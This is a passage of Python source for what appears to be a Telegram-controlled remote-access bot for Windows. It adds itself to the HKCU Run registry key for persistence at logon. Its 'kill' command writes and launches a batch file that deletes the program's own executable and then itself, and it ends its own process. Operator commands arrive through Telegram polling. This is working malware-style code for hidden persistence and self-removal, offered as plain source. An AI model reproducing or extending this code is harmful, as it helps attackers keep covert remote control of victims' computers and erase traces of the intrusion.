        regpath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        file_path = path  # name_proces

        try:
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, regpath)
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, regpath, 0,
                                          winreg.KEY_WRITE)
            winreg.SetValueEx(registry_key, name_file, 0, winreg.REG_SZ, file_path)
            winreg.CloseKey(registry_key)


        except WindowsError as e:
            bot.reply_to(message, e)

        else:
            bot.send_message(message.chat.id, "Successfully!")

        send_welcome_message(message)
        Turn_auto_start = False


@bot.message_handler(commands=["kill"], func=lambda check: Turn_access == True)
def send_text(message):
    bot.send_message(message.chat.id, "Run the kill function...")
    sleep(1)

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Yes")
    btn2 = types.KeyboardButton("Back")
    markup.add(btn1, btn2)
    bot.send_message(message.chat.id, "Are you sure? ".format(message.from_user), reply_markup=markup)
    sleep(0.5)

    global Turn_kill
    Turn_kill = True


@bot.message_handler(content_types=['text'], func=lambda check: Turn_kill == True)
def send_text(message):
    if message.text == "Back":
        global Turn_kill
        Turn_kill = False

        send_welcome_message(message)

    if message.text == "Yes":
        check_id(message)
        path = sys.argv[0]
        name_file = path.split(sep='\\', maxsplit=50)[-1]

        with open("1.bat", "w+") as del_file:
            del_file.write("TIMEOUT /T 1\ndel " + path + "\ndel %0")
            del_file.close()

        os.startfile("1.bat")

        proc_name = name_file  # name_proces

        for proc in psutil.process_iter():
            if proc.name() == proc_name:
                proc.kill()


if __name__ == '__main__':
    bot.polling(none_stop=True)
